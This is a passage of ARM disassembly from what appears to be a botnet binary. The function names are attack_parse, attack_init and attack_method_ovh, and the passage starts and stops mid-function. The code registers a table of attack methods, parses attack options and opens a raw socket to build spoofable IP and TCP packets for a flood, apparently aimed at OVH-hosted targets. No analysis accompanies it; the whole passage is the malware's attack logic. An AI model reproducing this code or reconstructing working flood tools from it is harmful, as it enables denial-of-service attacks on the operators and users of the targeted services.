    a25c:	e1520005 	cmp	r2, r5
    a260:	e086a003 	add	sl, r6, r3
    a264:	1affffe3 	bne	a1f8 <attack_parse+0x140>
    a268:	eb00317a 	bl	16858 <__GI___errno_location>
    a26c:	e3a03000 	mov	r3, #0
    a270:	e5803000 	str	r3, [r0]
    a274:	e59d1014 	ldr	r1, [sp, #20]
    a278:	e1a0000b 	mov	r0, fp
    a27c:	e1a02009 	mov	r2, r9
    a280:	e59d300c 	ldr	r3, [sp, #12]
    a284:	e88d0060 	stm	sp, {r5, r6}
    a288:	ebffff4b 	bl	9fbc <attack_start>
    a28c:	e59d300c 	ldr	r3, [sp, #12]
    a290:	e3530000 	cmp	r3, #0
    a294:	11a00003 	movne	r0, r3
    a298:	1b003828 	blne	18340 <free>
    a29c:	e3560000 	cmp	r6, #0
    a2a0:	0affff8a 	beq	a0d0 <attack_parse+0x18>
    a2a4:	e3550000 	cmp	r5, #0
    a2a8:	0a000006 	beq	a2c8 <attack_parse+0x210>
    a2ac:	e3a04000 	mov	r4, #0
    a2b0:	e7960184 	ldr	r0, [r6, r4, lsl #3]
    a2b4:	e3500000 	cmp	r0, #0
    a2b8:	e2844001 	add	r4, r4, #1
    a2bc:	1b00381f 	blne	18340 <free>
    a2c0:	e1550004 	cmp	r5, r4
    a2c4:	1afffff9 	bne	a2b0 <attack_parse+0x1f8>
    a2c8:	e1a00006 	mov	r0, r6
    a2cc:	eb00381b 	bl	18340 <free>
    a2d0:	eaffff7e 	b	a0d0 <attack_parse+0x18>

0000a2d4 <attack_get_opt_ip>:
    a2d4:	e3500000 	cmp	r0, #0
    a2d8:	e92d4010 	push	{r4, lr}
    a2dc:	e1a04003 	mov	r4, r3
    a2e0:	0a00000d 	beq	a31c <attack_get_opt_ip+0x48>
    a2e4:	e5d13004 	ldrb	r3, [r1, #4]
    a2e8:	e1530002 	cmp	r3, r2
    a2ec:	1281c008 	addne	ip, r1, #8
    a2f0:	13a0e000 	movne	lr, #0
    a2f4:	1a000004 	bne	a30c <attack_get_opt_ip+0x38>
    a2f8:	ea00000a 	b	a328 <attack_get_opt_ip+0x54>
    a2fc:	e5dc3004 	ldrb	r3, [ip, #4]
    a300:	e1520003 	cmp	r2, r3
    a304:	e28cc008 	add	ip, ip, #8
    a308:	0a000006 	beq	a328 <attack_get_opt_ip+0x54>
    a30c:	e28ee001 	add	lr, lr, #1
    a310:	e15e0000 	cmp	lr, r0
    a314:	e1a0100c 	mov	r1, ip
    a318:	1afffff7 	bne	a2fc <attack_get_opt_ip+0x28>
    a31c:	e1a00004 	mov	r0, r4
    a320:	e8bd4010 	pop	{r4, lr}
    a324:	e12fff1e 	bx	lr
    a328:	e5910000 	ldr	r0, [r1]
    a32c:	e3500000 	cmp	r0, #0
    a330:	0afffff9 	beq	a31c <attack_get_opt_ip+0x48>
    a334:	eb0031c7 	bl	16a58 <__GI_inet_addr>
    a338:	e1a04000 	mov	r4, r0
    a33c:	eafffff6 	b	a31c <attack_get_opt_ip+0x48>

0000a340 <attack_get_opt_int>:
    a340:	e3500000 	cmp	r0, #0
    a344:	e92d4010 	push	{r4, lr}
    a348:	e1a04003 	mov	r4, r3
    a34c:	0a00000d 	beq	a388 <attack_get_opt_int+0x48>
    a350:	e5d13004 	ldrb	r3, [r1, #4]
    a354:	e1530002 	cmp	r3, r2
    a358:	1281c008 	addne	ip, r1, #8
    a35c:	13a0e000 	movne	lr, #0
    a360:	1a000004 	bne	a378 <attack_get_opt_int+0x38>
    a364:	ea00000a 	b	a394 <attack_get_opt_int+0x54>
    a368:	e5dc3004 	ldrb	r3, [ip, #4]
    a36c:	e1520003 	cmp	r2, r3
    a370:	e28cc008 	add	ip, ip, #8
    a374:	0a000006 	beq	a394 <attack_get_opt_int+0x54>
    a378:	e28ee001 	add	lr, lr, #1
    a37c:	e15e0000 	cmp	lr, r0
    a380:	e1a0100c 	mov	r1, ip
    a384:	1afffff7 	bne	a368 <attack_get_opt_int+0x28>
    a388:	e1a00004 	mov	r0, r4
    a38c:	e8bd4010 	pop	{r4, lr}
    a390:	e12fff1e 	bx	lr
    a394:	e5910000 	ldr	r0, [r1]
    a398:	e3500000 	cmp	r0, #0
    a39c:	0afffff9 	beq	a388 <attack_get_opt_int+0x48>
    a3a0:	e3a0100a 	mov	r1, #10
    a3a4:	eb002a28 	bl	14c4c <util_atoi>
    a3a8:	e1a04000 	mov	r4, r0
    a3ac:	eafffff5 	b	a388 <attack_get_opt_int+0x48>

0000a3b0 <attack_init>:
    a3b0:	e92d41f0 	push	{r4, r5, r6, r7, r8, lr}
    a3b4:	e3a01008 	mov	r1, #8
    a3b8:	e3a00001 	mov	r0, #1
    a3bc:	eb003606 	bl	17bdc <calloc>
    a3c0:	e59f438c 	ldr	r4, [pc, #908]	; a754 <attack_init+0x3a4>
    a3c4:	e5d41000 	ldrb	r1, [r4]
    a3c8:	e59f6388 	ldr	r6, [pc, #904]	; a758 <attack_init+0x3a8>
    a3cc:	e59f3388 	ldr	r3, [pc, #904]	; a75c <attack_init+0x3ac>
    a3d0:	e3a07001 	mov	r7, #1
    a3d4:	e1a05000 	mov	r5, r0
    a3d8:	e2811001 	add	r1, r1, #1
    a3dc:	e5960000 	ldr	r0, [r6]
    a3e0:	e5853000 	str	r3, [r5]
    a3e4:	e5c57004 	strb	r7, [r5, #4]
    a3e8:	e1a01101 	lsl	r1, r1, #2
    a3ec:	eb00364a 	bl	17d1c <realloc>
    a3f0:	e5d43000 	ldrb	r3, [r4]
    a3f4:	e1a02000 	mov	r2, r0
    a3f8:	e7805103 	str	r5, [r0, r3, lsl #2]
    a3fc:	e3a01008 	mov	r1, #8
    a400:	e0833007 	add	r3, r3, r7
    a404:	e1a00007 	mov	r0, r7
    a408:	e5c43000 	strb	r3, [r4]
    a40c:	e5862000 	str	r2, [r6]
    a410:	eb0035f1 	bl	17bdc <calloc>
    a414:	e5d41000 	ldrb	r1, [r4]
    a418:	e59f2340 	ldr	r2, [pc, #832]	; a760 <attack_init+0x3b0>
    a41c:	e1a05000 	mov	r5, r0
    a420:	e3a03002 	mov	r3, #2
    a424:	e0811007 	add	r1, r1, r7
    a428:	e5960000 	ldr	r0, [r6]
    a42c:	e5852000 	str	r2, [r5]
    a430:	e5c53004 	strb	r3, [r5, #4]
    a434:	e1a01101 	lsl	r1, r1, #2
    a438:	eb003637 	bl	17d1c <realloc>
    a43c:	e5d43000 	ldrb	r3, [r4]
    a440:	e1a02000 	mov	r2, r0
    a444:	e7805103 	str	r5, [r0, r3, lsl #2]
    a448:	e3a01008 	mov	r1, #8
    a44c:	e0833007 	add	r3, r3, r7
    a450:	e1a00007 	mov	r0, r7
    a454:	e5c43000 	strb	r3, [r4]
    a458:	e5862000 	str	r2, [r6]
    a45c:	eb0035de 	bl	17bdc <calloc>
    a460:	e5d41000 	ldrb	r1, [r4]
    a464:	e59f22f8 	ldr	r2, [pc, #760]	; a764 <attack_init+0x3b4>
    a468:	e1a05000 	mov	r5, r0
    a46c:	e3a03005 	mov	r3, #5
    a470:	e0811007 	add	r1, r1, r7
    a474:	e5960000 	ldr	r0, [r6]
    a478:	e5852000 	str	r2, [r5]
    a47c:	e5c53004 	strb	r3, [r5, #4]
    a480:	e1a01101 	lsl	r1, r1, #2
    a484:	eb003624 	bl	17d1c <realloc>
    a488:	e5d43000 	ldrb	r3, [r4]
    a48c:	e1a02000 	mov	r2, r0
    a490:	e7805103 	str	r5, [r0, r3, lsl #2]
    a494:	e3a01008 	mov	r1, #8
    a498:	e0833007 	add	r3, r3, r7
    a49c:	e1a00007 	mov	r0, r7
    a4a0:	e5c43000 	strb	r3, [r4]
    a4a4:	e5862000 	str	r2, [r6]
    a4a8:	eb0035cb 	bl	17bdc <calloc>
    a4ac:	e5d41000 	ldrb	r1, [r4]
    a4b0:	e59f22b0 	ldr	r2, [pc, #688]	; a768 <attack_init+0x3b8>
    a4b4:	e1a05000 	mov	r5, r0
    a4b8:	e3a03004 	mov	r3, #4
    a4bc:	e0811007 	add	r1, r1, r7
    a4c0:	e5960000 	ldr	r0, [r6]
    a4c4:	e5852000 	str	r2, [r5]
    a4c8:	e5c53004 	strb	r3, [r5, #4]
    a4cc:	e1a01101 	lsl	r1, r1, #2
    a4d0:	eb003611 	bl	17d1c <realloc>
    a4d4:	e5d43000 	ldrb	r3, [r4]
    a4d8:	e1a02000 	mov	r2, r0
    a4dc:	e7805103 	str	r5, [r0, r3, lsl #2]
    a4e0:	e3a01008 	mov	r1, #8
    a4e4:	e0833007 	add	r3, r3, r7
    a4e8:	e1a00007 	mov	r0, r7
    a4ec:	e5c43000 	strb	r3, [r4]
    a4f0:	e5862000 	str	r2, [r6]
    a4f4:	eb0035b8 	bl	17bdc <calloc>
    a4f8:	e5d41000 	ldrb	r1, [r4]
    a4fc:	e59f2268 	ldr	r2, [pc, #616]	; a76c <attack_init+0x3bc>
    a500:	e1a05000 	mov	r5, r0
    a504:	e3a03003 	mov	r3, #3
    a508:	e0811007 	add	r1, r1, r7
    a50c:	e5960000 	ldr	r0, [r6]
    a510:	e5852000 	str	r2, [r5]
    a514:	e5c53004 	strb	r3, [r5, #4]
    a518:	e1a01101 	lsl	r1, r1, #2
    a51c:	eb0035fe 	bl	17d1c <realloc>
    a520:	e5d43000 	ldrb	r3, [r4]
    a524:	e1a02000 	mov	r2, r0
    a528:	e7805103 	str	r5, [r0, r3, lsl #2]
    a52c:	e3a01008 	mov	r1, #8
    a530:	e0833007 	add	r3, r3, r7
    a534:	e1a00007 	mov	r0, r7
    a538:	e5c43000 	strb	r3, [r4]
    a53c:	e5862000 	str	r2, [r6]
    a540:	eb0035a5 	bl	17bdc <calloc>
    a544:	e5d41000 	ldrb	r1, [r4]
    a548:	e59f2220 	ldr	r2, [pc, #544]	; a770 <attack_init+0x3c0>
    a54c:	e1a05000 	mov	r5, r0
    a550:	e3a03006 	mov	r3, #6
    a554:	e0811007 	add	r1, r1, r7
    a558:	e5960000 	ldr	r0, [r6]
    a55c:	e5852000 	str	r2, [r5]
    a560:	e5c53004 	strb	r3, [r5, #4]
    a564:	e1a01101 	lsl	r1, r1, #2
    a568:	eb0035eb 	bl	17d1c <realloc>
    a56c:	e5d43000 	ldrb	r3, [r4]
    a570:	e1a02000 	mov	r2, r0
    a574:	e7805103 	str	r5, [r0, r3, lsl #2]
    a578:	e3a01008 	mov	r1, #8
    a57c:	e0833007 	add	r3, r3, r7
    a580:	e1a00007 	mov	r0, r7
    a584:	e5c43000 	strb	r3, [r4]
    a588:	e5862000 	str	r2, [r6]
    a58c:	eb003592 	bl	17bdc <calloc>
    a590:	e5d41000 	ldrb	r1, [r4]
    a594:	e59f21d8 	ldr	r2, [pc, #472]	; a774 <attack_init+0x3c4>
    a598:	e1a05000 	mov	r5, r0
    a59c:	e3a03000 	mov	r3, #0
    a5a0:	e0811007 	add	r1, r1, r7
    a5a4:	e5960000 	ldr	r0, [r6]
    a5a8:	e5852000 	str	r2, [r5]
    a5ac:	e5c53004 	strb	r3, [r5, #4]
    a5b0:	e1a01101 	lsl	r1, r1, #2
    a5b4:	eb0035d8 	bl	17d1c <realloc>
    a5b8:	e5d43000 	ldrb	r3, [r4]
    a5bc:	e1a02000 	mov	r2, r0
    a5c0:	e7805103 	str	r5, [r0, r3, lsl #2]
    a5c4:	e3a01008 	mov	r1, #8
    a5c8:	e0833007 	add	r3, r3, r7
    a5cc:	e1a00007 	mov	r0, r7
    a5d0:	e5862000 	str	r2, [r6]
    a5d4:	e5c43000 	strb	r3, [r4]
    a5d8:	eb00357f 	bl	17bdc <calloc>
    a5dc:	e5d41000 	ldrb	r1, [r4]
    a5e0:	e59f3190 	ldr	r3, [pc, #400]	; a778 <attack_init+0x3c8>
    a5e4:	e3a08008 	mov	r8, #8
    a5e8:	e1a05000 	mov	r5, r0
    a5ec:	e0811007 	add	r1, r1, r7
    a5f0:	e5960000 	ldr	r0, [r6]
    a5f4:	e5853000 	str	r3, [r5]
    a5f8:	e5c58004 	strb	r8, [r5, #4]
    a5fc:	e1a01101 	lsl	r1, r1, #2
    a600:	eb0035c5 	bl	17d1c <realloc>
    a604:	e5d43000 	ldrb	r3, [r4]
    a608:	e1a02000 	mov	r2, r0
    a60c:	e7805103 	str	r5, [r0, r3, lsl #2]
    a610:	e1a01008 	mov	r1, r8
    a614:	e0833007 	add	r3, r3, r7
    a618:	e1a00007 	mov	r0, r7
    a61c:	e5c43000 	strb	r3, [r4]
    a620:	e5862000 	str	r2, [r6]
    a624:	eb00356c 	bl	17bdc <calloc>
    a628:	e5d41000 	ldrb	r1, [r4]
    a62c:	e59f2148 	ldr	r2, [pc, #328]	; a77c <attack_init+0x3cc>
    a630:	e1a05000 	mov	r5, r0
    a634:	e3a03009 	mov	r3, #9
    a638:	e0811007 	add	r1, r1, r7
    a63c:	e5960000 	ldr	r0, [r6]
    a640:	e5852000 	str	r2, [r5]
    a644:	e5c53004 	strb	r3, [r5, #4]
    a648:	e1a01101 	lsl	r1, r1, #2
    a64c:	eb0035b2 	bl	17d1c <realloc>
    a650:	e5d43000 	ldrb	r3, [r4]
    a654:	e1a02000 	mov	r2, r0
    a658:	e7805103 	str	r5, [r0, r3, lsl #2]
    a65c:	e1a01008 	mov	r1, r8
    a660:	e0833007 	add	r3, r3, r7
    a664:	e1a00007 	mov	r0, r7
    a668:	e5c43000 	strb	r3, [r4]
    a66c:	e5862000 	str	r2, [r6]
    a670:	eb003559 	bl	17bdc <calloc>
    a674:	e5d41000 	ldrb	r1, [r4]
    a678:	e59f2100 	ldr	r2, [pc, #256]	; a780 <attack_init+0x3d0>
    a67c:	e1a05000 	mov	r5, r0
    a680:	e3a0300a 	mov	r3, #10
    a684:	e0811007 	add	r1, r1, r7
    a688:	e5960000 	ldr	r0, [r6]
    a68c:	e5852000 	str	r2, [r5]
    a690:	e5c53004 	strb	r3, [r5, #4]
    a694:	e1a01101 	lsl	r1, r1, #2
    a698:	eb00359f 	bl	17d1c <realloc>
    a69c:	e5d43000 	ldrb	r3, [r4]
    a6a0:	e1a02000 	mov	r2, r0
    a6a4:	e7805103 	str	r5, [r0, r3, lsl #2]
    a6a8:	e1a01008 	mov	r1, r8
    a6ac:	e0833007 	add	r3, r3, r7
    a6b0:	e1a00007 	mov	r0, r7
    a6b4:	e5c43000 	strb	r3, [r4]
    a6b8:	e5862000 	str	r2, [r6]
    a6bc:	eb003546 	bl	17bdc <calloc>
    a6c0:	e5d41000 	ldrb	r1, [r4]
    a6c4:	e59f20b8 	ldr	r2, [pc, #184]	; a784 <attack_init+0x3d4>
    a6c8:	e1a05000 	mov	r5, r0
    a6cc:	e3a0300b 	mov	r3, #11
    a6d0:	e0811007 	add	r1, r1, r7
    a6d4:	e5960000 	ldr	r0, [r6]
    a6d8:	e5852000 	str	r2, [r5]
    a6dc:	e5c53004 	strb	r3, [r5, #4]
    a6e0:	e1a01101 	lsl	r1, r1, #2
    a6e4:	eb00358c 	bl	17d1c <realloc>
    a6e8:	e5d43000 	ldrb	r3, [r4]
    a6ec:	e1a02000 	mov	r2, r0
    a6f0:	e7805103 	str	r5, [r0, r3, lsl #2]
    a6f4:	e1a01008 	mov	r1, r8
    a6f8:	e0833007 	add	r3, r3, r7
    a6fc:	e1a00007 	mov	r0, r7
    a700:	e5c43000 	strb	r3, [r4]
    a704:	e5862000 	str	r2, [r6]
    a708:	eb003533 	bl	17bdc <calloc>
    a70c:	e5d41000 	ldrb	r1, [r4]
    a710:	e59f2070 	ldr	r2, [pc, #112]	; a788 <attack_init+0x3d8>
    a714:	e1a05000 	mov	r5, r0
    a718:	e3a03007 	mov	r3, #7
    a71c:	e0811007 	add	r1, r1, r7
    a720:	e5960000 	ldr	r0, [r6]
    a724:	e5852000 	str	r2, [r5]
    a728:	e5c53004 	strb	r3, [r5, #4]
    a72c:	e1a01101 	lsl	r1, r1, #2
    a730:	eb003579 	bl	17d1c <realloc>
    a734:	e5d43000 	ldrb	r3, [r4]
    a738:	e5860000 	str	r0, [r6]
    a73c:	e7805103 	str	r5, [r0, r3, lsl #2]
    a740:	e0832007 	add	r2, r3, r7
    a744:	e1a00007 	mov	r0, r7
    a748:	e5c42000 	strb	r2, [r4]
    a74c:	e8bd41f0 	pop	{r4, r5, r6, r7, r8, lr}
    a750:	e12fff1e 	bx	lr
    a754:	00028c88 	.word	0x00028c88
    a758:	00028c8c 	.word	0x00028c8c
    a75c:	0000b4e4 	.word	0x0000b4e4
    a760:	0000c23c 	.word	0x0000c23c
    a764:	0000e0bc 	.word	0x0000e0bc
    a768:	0000dd88 	.word	0x0000dd88
    a76c:	0000d6b0 	.word	0x0000d6b0
    a770:	0000c934 	.word	0x0000c934
    a774:	0000d950 	.word	0x0000d950
    a778:	0000bb90 	.word	0x0000bb90
    a77c:	0000ae38 	.word	0x0000ae38
    a780:	0000ce20 	.word	0x0000ce20
    a784:	0000a78c 	.word	0x0000a78c
    a788:	000081d0 	.word	0x000081d0

0000a78c <attack_method_ovh>:
    a78c:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    a790:	e1a08001 	mov	r8, r1
    a794:	e24dd074 	sub	sp, sp, #116	; 0x74
    a798:	e3a01004 	mov	r1, #4
    a79c:	e1a04002 	mov	r4, r2
    a7a0:	e1a05003 	mov	r5, r3
    a7a4:	e1a07000 	mov	r7, r0
    a7a8:	eb00350b 	bl	17bdc <calloc>
    a7ac:	e1a01005 	mov	r1, r5
    a7b0:	e3a02002 	mov	r2, #2
    a7b4:	e3a03000 	mov	r3, #0
    a7b8:	e1a09000 	mov	r9, r0
    a7bc:	e1a00004 	mov	r0, r4
    a7c0:	ebfffede 	bl	a340 <attack_get_opt_int>
    a7c4:	e3a03801 	mov	r3, #65536	; 0x10000
    a7c8:	e1a0c000 	mov	ip, r0
    a7cc:	e20cc0ff 	and	ip, ip, #255	; 0xff
    a7d0:	e2433001 	sub	r3, r3, #1
    a7d4:	e3a02003 	mov	r2, #3
    a7d8:	e1a01005 	mov	r1, r5
    a7dc:	e1a00004 	mov	r0, r4
    a7e0:	e58dc048 	str	ip, [sp, #72]	; 0x48
    a7e4:	ebfffed5 	bl	a340 <attack_get_opt_int>
    a7e8:	e1a01005 	mov	r1, r5
    a7ec:	e58d0024 	str	r0, [sp, #36]	; 0x24
    a7f0:	e3a02004 	mov	r2, #4
    a7f4:	e3a03040 	mov	r3, #64	; 0x40
    a7f8:	e1a00004 	mov	r0, r4
    a7fc:	ebfffecf 	bl	a340 <attack_get_opt_int>
    a800:	e1a0c000 	mov	ip, r0
    a804:	e20cc0ff 	and	ip, ip, #255	; 0xff
    a808:	e1a01005 	mov	r1, r5
    a80c:	e3a02005 	mov	r2, #5
    a810:	e3a03001 	mov	r3, #1
    a814:	e1a00004 	mov	r0, r4
    a818:	e58dc050 	str	ip, [sp, #80]	; 0x50
    a81c:	ebfffec7 	bl	a340 <attack_get_opt_int>
    a820:	e3a03801 	mov	r3, #65536	; 0x10000
    a824:	e1a0c000 	mov	ip, r0
    a828:	e20cc0ff 	and	ip, ip, #255	; 0xff
    a82c:	e2433001 	sub	r3, r3, #1
    a830:	e3a02006 	mov	r2, #6
    a834:	e1a01005 	mov	r1, r5
    a838:	e1a00004 	mov	r0, r4
    a83c:	e58dc054 	str	ip, [sp, #84]	; 0x54
    a840:	ebfffebe 	bl	a340 <attack_get_opt_int>
    a844:	e3a03801 	mov	r3, #65536	; 0x10000
    a848:	e1a01005 	mov	r1, r5
    a84c:	e2433001 	sub	r3, r3, #1
    a850:	e3a02007 	mov	r2, #7
    a854:	e1a0b000 	mov	fp, r0
    a858:	e1a00004 	mov	r0, r4
    a85c:	ebfffeb7 	bl	a340 <attack_get_opt_int>
    a860:	e3a03801 	mov	r3, #65536	; 0x10000
    a864:	e1a01005 	mov	r1, r5
    a868:	e2433001 	sub	r3, r3, #1
    a86c:	e3a02011 	mov	r2, #17
    a870:	e1a06000 	mov	r6, r0
    a874:	e1a00004 	mov	r0, r4
    a878:	ebfffeb0 	bl	a340 <attack_get_opt_int>
    a87c:	e1a01005 	mov	r1, r5
    a880:	e58d0028 	str	r0, [sp, #40]	; 0x28
    a884:	e3a02012 	mov	r2, #18
    a888:	e3a03000 	mov	r3, #0
    a88c:	e1a00004 	mov	r0, r4
    a890:	ebfffeaa 	bl	a340 <attack_get_opt_int>
    a894:	e1a01005 	mov	r1, r5
    a898:	e58d002c 	str	r0, [sp, #44]	; 0x2c
    a89c:	e3a0200b 	mov	r2, #11
    a8a0:	e3a03000 	mov	r3, #0
    a8a4:	e1a00004 	mov	r0, r4
    a8a8:	ebfffea4 	bl	a340 <attack_get_opt_int>
    a8ac:	e1a01005 	mov	r1, r5
    a8b0:	e58d0030 	str	r0, [sp, #48]	; 0x30
    a8b4:	e3a0200c 	mov	r2, #12
    a8b8:	e3a03000 	mov	r3, #0
    a8bc:	e1a00004 	mov	r0, r4
    a8c0:	ebfffe9e 	bl	a340 <attack_get_opt_int>
    a8c4:	e1a01005 	mov	r1, r5
    a8c8:	e58d0034 	str	r0, [sp, #52]	; 0x34
    a8cc:	e3a0200d 	mov	r2, #13
    a8d0:	e3a03000 	mov	r3, #0
    a8d4:	e1a00004 	mov	r0, r4
    a8d8:	ebfffe98 	bl	a340 <attack_get_opt_int>
    a8dc:	e1a01005 	mov	r1, r5
    a8e0:	e58d0038 	str	r0, [sp, #56]	; 0x38
    a8e4:	e3a0200e 	mov	r2, #14
    a8e8:	e3a03000 	mov	r3, #0
    a8ec:	e1a00004 	mov	r0, r4
    a8f0:	ebfffe92 	bl	a340 <attack_get_opt_int>
    a8f4:	e1a01005 	mov	r1, r5
    a8f8:	e58d003c 	str	r0, [sp, #60]	; 0x3c
    a8fc:	e3a0200f 	mov	r2, #15
    a900:	e3a03000 	mov	r3, #0
    a904:	e1a00004 	mov	r0, r4
    a908:	ebfffe8c 	bl	a340 <attack_get_opt_int>
    a90c:	e1a01005 	mov	r1, r5
    a910:	e58d0040 	str	r0, [sp, #64]	; 0x40
    a914:	e3a02010 	mov	r2, #16
    a918:	e3a03000 	mov	r3, #0
    a91c:	e1a00004 	mov	r0, r4
    a920:	ebfffe86 	bl	a340 <attack_get_opt_int>
    a924:	e59f2508 	ldr	r2, [pc, #1288]	; ae34 <attack_method_ovh+0x6a8>
    a928:	e58d0044 	str	r0, [sp, #68]	; 0x44
    a92c:	e5923000 	ldr	r3, [r2]
    a930:	e1a01005 	mov	r1, r5
    a934:	e3a02019 	mov	r2, #25
    a938:	e1a00004 	mov	r0, r4
    a93c:	ebfffe64 	bl	a2d4 <attack_get_opt_ip>
    a940:	e3a01003 	mov	r1, #3
    a944:	e58d0060 	str	r0, [sp, #96]	; 0x60
    a948:	e3a02006 	mov	r2, #6
    a94c:	e3a00002 	mov	r0, #2
    a950:	eb0031bf 	bl	17054 <__GI_socket>
    a954:	e3700001 	cmn	r0, #1
    a958:	e1a0a000 	mov	sl, r0
    a95c:	0a000131 	beq	ae28 <attack_method_ovh+0x69c>
    a960:	e28d3070 	add	r3, sp, #112	; 0x70
    a964:	e3a02001 	mov	r2, #1
    a968:	e5232004 	str	r2, [r3, #-4]!
    a96c:	e3a0c004 	mov	ip, #4
    a970:	e3a01000 	mov	r1, #0
    a974:	e2822002 	add	r2, r2, #2
    a978:	e58dc000 	str	ip, [sp]
    a97c:	eb0031a2 	bl	1700c <__GI_setsockopt>
    a980:	e3700001 	cmn	r0, #1
    a984:	0a000125 	beq	ae20 <attack_method_ovh+0x694>
    a988:	e59d1024 	ldr	r1, [sp, #36]	; 0x24
    a98c:	e3a02000 	mov	r2, #0
    a990:	e1a00801 	lsl	r0, r1, #16
    a994:	e1a0480b 	lsl	r4, fp, #16
    a998:	e1a05806 	lsl	r5, r6, #16
    a99c:	e58d206c 	str	r2, [sp, #108]	; 0x6c
    a9a0:	e59d2030 	ldr	r2, [sp, #48]	; 0x30
    a9a4:	e1a03820 	lsr	r3, r0, #16
    a9a8:	e1a06824 	lsr	r6, r4, #16
    a9ac:	e1a01825 	lsr	r1, r5, #16
    a9b0:	e3570000 	cmp	r7, #0
    a9b4:	e58d304c 	str	r3, [sp, #76]	; 0x4c
    a9b8:	e58d6058 	str	r6, [sp, #88]	; 0x58
    a9bc:	e58d105c 	str	r1, [sp, #92]	; 0x5c
    a9c0:	e202b0ff 	and	fp, r2, #255	; 0xff
    a9c4:	0a000092 	beq	ac14 <attack_method_ovh+0x488>
    a9c8:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    a9cc:	e1a0e803 	lsl	lr, r3, #16
    a9d0:	e1a03c06 	lsl	r3, r6, #24
    a9d4:	e59d604c 	ldr	r6, [sp, #76]	; 0x4c
    a9d8:	e1a02c01 	lsl	r2, r1, #24
    a9dc:	e1a0140e 	lsl	r1, lr, #8
    a9e0:	e1a01821 	lsr	r1, r1, #16
    a9e4:	e1a00c20 	lsr	r0, r0, #24
    a9e8:	e206c0ff 	and	ip, r6, #255	; 0xff
    a9ec:	e181ec2e 	orr	lr, r1, lr, lsr #24
    a9f0:	e180c40c 	orr	ip, r0, ip, lsl #8
    a9f4:	e28d0030 	add	r0, sp, #48	; 0x30
    a9f8:	e8900003 	ldm	r0, {r0, r1}
    a9fc:	e1a03823 	lsr	r3, r3, #16
    aa00:	e1a02822 	lsr	r2, r2, #16
    aa04:	e2000001 	and	r0, r0, #1
    aa08:	e2011001 	and	r1, r1, #1
    aa0c:	e1836c24 	orr	r6, r3, r4, lsr #24
    aa10:	e1825c25 	orr	r5, r2, r5, lsr #24
    aa14:	e58d000c 	str	r0, [sp, #12]
    aa18:	e58d1010 	str	r1, [sp, #16]
    aa1c:	e28d2038 	add	r2, sp, #56	; 0x38
    aa20:	e892000c 	ldm	r2, {r2, r3}
    aa24:	e28d0040 	add	r0, sp, #64	; 0x40
    aa28:	e8900003 	ldm	r0, {r0, r1}
    aa2c:	e2022001 	and	r2, r2, #1
    aa30:	e2033001 	and	r3, r3, #1
    aa34:	e2000001 	and	r0, r0, #1
    aa38:	e2011001 	and	r1, r1, #1
    aa3c:	e58de064 	str	lr, [sp, #100]	; 0x64
    aa40:	e58dc008 	str	ip, [sp, #8]
    aa44:	e58d2014 	str	r2, [sp, #20]
    aa48:	e58d3018 	str	r3, [sp, #24]
    aa4c:	e58d001c 	str	r0, [sp, #28]
    aa50:	e58d1020 	str	r1, [sp, #32]
    aa54:	e3a04000 	mov	r4, #0
    aa58:	e3a01001 	mov	r1, #1
    aa5c:	e3a00080 	mov	r0, #128	; 0x80
    aa60:	eb00345d 	bl	17bdc <calloc>
    aa64:	e59d206c 	ldr	r2, [sp, #108]	; 0x6c
    aa68:	e7890104 	str	r0, [r9, r4, lsl #2]
    aa6c:	e1a03282 	lsl	r3, r2, #5
    aa70:	e7994102 	ldr	r4, [r9, r2, lsl #2]
    aa74:	e0433182 	sub	r3, r3, r2, lsl #3
    aa78:	e0830008 	add	r0, r3, r8
    aa7c:	e5d43000 	ldrb	r3, [r4]
    aa80:	e3c330b0 	bic	r3, r3, #176	; 0xb0
    aa84:	e3833040 	orr	r3, r3, #64	; 0x40
    aa88:	e5c43000 	strb	r3, [r4]
    aa8c:	e5d42000 	ldrb	r2, [r4]
    aa90:	e3c2200a 	bic	r2, r2, #10
    aa94:	e3822005 	orr	r2, r2, #5
    aa98:	e59d3054 	ldr	r3, [sp, #84]	; 0x54
    aa9c:	e5c42000 	strb	r2, [r4]
    aaa0:	e59d1048 	ldr	r1, [sp, #72]	; 0x48
    aaa4:	e5c41001 	strb	r1, [r4, #1]
    aaa8:	e59d2050 	ldr	r2, [sp, #80]	; 0x50
    aaac:	e3530000 	cmp	r3, #0
    aab0:	e3a03b0f 	mov	r3, #15360	; 0x3c00
    aab4:	e5c42008 	strb	r2, [r4, #8]
    aab8:	e1c430b2 	strh	r3, [r4, #2]
    aabc:	e3a03006 	mov	r3, #6
    aac0:	e59d1008 	ldr	r1, [sp, #8]
    aac4:	13a02040 	movne	r2, #64	; 0x40
    aac8:	e5c43009 	strb	r3, [r4, #9]
    aacc:	11c420b6 	strhne	r2, [r4, #6]
    aad0:	e59d2060 	ldr	r2, [sp, #96]	; 0x60
    aad4:	e584200c 	str	r2, [r4, #12]
    aad8:	e5903010 	ldr	r3, [r0, #16]
    aadc:	e1c410b4 	strh	r1, [r4, #4]
    aae0:	e5843010 	str	r3, [r4, #16]
    aae4:	e1c461b4 	strh	r6, [r4, #20]
    aae8:	e2841014 	add	r1, r4, #20
    aaec:	e5d1300c 	ldrb	r3, [r1, #12]
    aaf0:	e5d1200d 	ldrb	r2, [r1, #13]
    aaf4:	e59d000c 	ldr	r0, [sp, #12]
    aaf8:	e3c33050 	bic	r3, r3, #80	; 0x50
    aafc:	e38330a0 	orr	r3, r3, #160	; 0xa0
    ab00:	e3c22020 	bic	r2, r2, #32
    ab04:	e5c1300c 	strb	r3, [r1, #12]
    ab08:	e1822280 	orr	r2, r2, r0, lsl #5
    ab0c:	e59d3064 	ldr	r3, [sp, #100]	; 0x64
    ab10:	e5c1200d 	strb	r2, [r1, #13]
    ab14:	e5813004 	str	r3, [r1, #4]
    ab18:	e5d1300d 	ldrb	r3, [r1, #13]
    ab1c:	e59d0010 	ldr	r0, [sp, #16]
    ab20:	e3c33010 	bic	r3, r3, #16
    ab24:	e1833200 	orr	r3, r3, r0, lsl #4
    ab28:	e5c1300d 	strb	r3, [r1, #13]
    ab2c:	e5d1200d 	ldrb	r2, [r1, #13]
    ab30:	e59d3014 	ldr	r3, [sp, #20]
    ab34:	e3c22008 	bic	r2, r2, #8
    ab38:	e1822183 	orr	r2, r2, r3, lsl #3
    ab3c:	e1c150b2 	strh	r5, [r1, #2]
    ab40:	e5c1200d 	strb	r2, [r1, #13]
